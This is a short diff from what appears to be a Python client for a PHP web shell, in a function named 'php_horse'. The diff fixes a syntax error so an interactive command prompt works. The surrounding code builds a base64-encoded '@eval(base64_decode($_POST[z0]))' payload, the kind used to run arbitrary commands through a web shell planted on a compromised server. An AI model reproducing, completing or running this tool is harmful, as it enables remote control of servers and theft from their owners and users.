@@ -20,7 +20,7 @@ def php_horse(url,parameter,header,pa=""):
 	cmd=str(input("\n["+str(file_path)+"]$ "))
 	if cmd == "":
 		return "None"
-	elif cmd =="exit"
+	elif cmd =="exit":
 		return "exit"
 	#za=@eval(base64_decode($_POST[z0]));
 	zaphp="@eval(base64_decode(\"QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejBdKSk7\"));"
